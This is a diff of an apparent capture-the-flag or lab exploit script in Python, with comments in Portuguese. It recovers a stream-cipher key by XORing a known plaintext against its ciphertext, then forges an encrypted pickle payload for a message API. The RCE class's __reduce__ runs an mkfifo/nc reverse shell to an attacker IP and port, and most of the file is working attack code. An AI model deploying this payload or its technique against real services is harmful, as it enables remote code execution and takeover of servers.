@@ -3,8 +3,6 @@ import pickle
 import base64
 import os
 
-from Crypto.Random import get_random_bytes
-
 def manipulate_ciphertext(ciphertext, known_plaintext, new_plaintext):
     """
     Takes an original ciphertext and known plaintext, along with a new plaintext.
@@ -18,23 +16,37 @@ def manipulate_ciphertext(ciphertext, known_plaintext, new_plaintext):
 
 
 class RCE:
+    ip: str
+    port: int
     def __reduce__(self):
         cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
-               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
+               f'/bin/sh -i 2>&1 | nc {self.ip} {self.port} > /tmp/f')
         return os.system, (cmd,)
 
 
 if __name__ == '__main__':
-    payload = pickled = pickle.dumps(RCE())
-    plaintext = str(get_random_bytes(len(payload)))
+
+    # 3. Gerar um payload válido;
+    pwned = RCE()
+    pwned.ip = "10.10.0.1"
+    pwned.port = 4444
+    payload = pickled = pickle.dumps(pwned)
     
+    # 1. Gerar uma mensagem cifrada a parir de um texto conhecido;
+    plaintext = str("Z" * (len(payload)))
+
     response = requests.post(
-        "http://infobazaar.store/api/message/", json={"content": plaintext}
+        "http://localhost/api/message/", json={"content": plaintext}
     )
     uuid = response.json()["uuid"]
 
-    response = requests.get(f"http://infobazaar.store/api/message/{uuid}/")
+    # 2. Obter a chave da cifra de fluo realizando uma operação XOR entre o
+    # cifrotexto do passo anterior e o texto plano usado para gerá-lo;
+    response = requests.get(f"http://localhost/api/message/{uuid}/")
     ciphertext = base64.urlsafe_b64decode(response.content)
 
+    # 4. Cifrar o payload usando a chave da cifra de fluxo obtida no passo 2 a
+    # partir de uma oepração XOR.
     evil = manipulate_ciphertext(ciphertext[:len(payload)], plaintext.encode()[:len(payload)], payload)
-    print(base64.urlsafe_b64encode(evil))
+    
+    print(base64.urlsafe_b64encode(evil).decode())
